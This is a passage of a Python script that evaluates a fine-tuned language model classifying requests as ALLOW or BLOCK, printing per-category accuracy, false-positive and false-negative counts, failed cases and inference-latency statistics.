model = PeftModel.from_pretrained(base_model, ADAPTER_DIR)
model.eval()
print("      Modelo cargado OK\n")

device = "cuda" if torch.cuda.is_available() else "cpu"
end_token_id = tokenizer.convert_tokens_to_ids("###END###")


# ── Inferencia ────────────────────────────────────────────────────
def classify(request):
    prompt = (
        f"<|system|>\n{INSTRUCTION}</s>\n"
        f"<|user|>\n{request}</s>\n"
        f"<|assistant|>\n"
    )
    inputs = tokenizer(prompt, return_tensors="pt").to(device)
    with torch.no_grad():
        outputs = model.generate(
            **inputs,
            max_new_tokens=40,
            do_sample=False,
            pad_token_id=tokenizer.eos_token_id,
            eos_token_id=end_token_id,
        )
    input_len = inputs["input_ids"].shape[1]
    new_tokens = outputs[0][input_len:]
    response = tokenizer.decode(new_tokens, skip_special_tokens=True)
    match = re.search(r"(ALLOW|BLOCK)\s*\|\s*(.+?)(?:\s*###END###|\.|$)", response)
    if match:
        return f"{match.group(1)} | {match.group(2).strip()}"
    return response.split("\n")[0].strip()


# ── Correr suite completa ─────────────────────────────────────────
print("[2/3] Clasificando requests de prueba...\n")

category_stats = defaultdict(lambda: {"correct": 0, "total": 0, "failures": []})
total_correct = 0
false_positives = 0   # ALLOW expected but BLOCK returned
false_negatives = 0   # BLOCK expected but ALLOW returned

for request, expected, category, description in ALL_CASES:
    result = classify(request)
    got = "BLOCK" if "BLOCK" in result.upper() else "ALLOW"
    ok = got == expected
    category_stats[category]["total"] += 1
    if ok:
        category_stats[category]["correct"] += 1
        total_correct += 1
    else:
        category_stats[category]["failures"].append((description, expected, got, result))
        if expected == "ALLOW" and got == "BLOCK":
            false_positives += 1
        elif expected == "BLOCK" and got == "ALLOW":
            false_negatives += 1

total_cases = len(ALL_CASES)

# ── Per-category summary ──────────────────────────────────────────
print("=" * 72)
print(f"{'CATEGORY':<30} {'CORRECT':>8} {'TOTAL':>6} {'ACCURACY':>9}")
print("=" * 72)
for cat in sorted(category_stats.keys()):
    s = category_stats[cat]
    pct = 100 * s["correct"] // s["total"] if s["total"] else 0
    print(f"{cat:<30} {s['correct']:>8} {s['total']:>6} {pct:>8}%")
print("=" * 72)
print(f"{'OVERALL':<30} {total_correct:>8} {total_cases:>6} {100*total_correct//total_cases:>8}%")
print(f"\nFalse positives (ALLOW→BLOCK): {false_positives}")
print(f"False negatives (BLOCK→ALLOW): {false_negatives}")

# ── Failures detail ───────────────────────────────────────────────
all_failures = [
    (cat, desc, exp, got, resp)
    for cat, s in category_stats.items()
    for (desc, exp, got, resp) in s["failures"]
]
if all_failures:
    print(f"\n{'=' * 72}")
    print(f"FAILED CASES ({len(all_failures)} total)")
    print("=" * 72)
    for cat, desc, exp, got, resp in all_failures:
        print(f"  [{exp}→{got}] [{cat}] {desc}")
        print(f"  Model output: {resp}")
        print()
else:
    print("\nAll cases passed!")

# ── Inference benchmark ───────────────────────────────────────────
print("\n[3/3] Inference benchmark (100 samples from eval.jsonl)...\n")

with open(EVAL_FILE) as f:
    all_samples = [json.loads(line) for line in f]

block_samples = [s for s in all_samples if s["output"].startswith("BLOCK")]
allow_samples = [s for s in all_samples if s["output"].startswith("ALLOW")]

random.seed(42)
bench_samples = random.sample(block_samples, 50) + random.sample(allow_samples, 50)
random.shuffle(bench_samples)

latencies_ms = []
for i, sample in enumerate(bench_samples, 1):
    t0 = time.perf_counter()
    classify(sample["input"])
    latencies_ms.append((time.perf_counter() - t0) * 1000)
    if i % 10 == 0:
        print(f"  {i}/100 done...")

print()
print("=" * 72)
print("INFERENCE BENCHMARK — 100 samples (50 BLOCK + 50 ALLOW from eval.jsonl)")
print("=" * 72)
print(f"  Average latency : {statistics.mean(latencies_ms):>8.1f} ms")
print(f"  Minimum latency : {min(latencies_ms):>8.1f} ms")
print(f"  Maximum latency : {max(latencies_ms):>8.1f} ms")
print(f"  Std deviation   : {statistics.stdev(latencies_ms):>8.1f} ms")
print(f"  Median latency  : {statistics.median(latencies_ms):>8.1f} ms")
print("=" * 72)
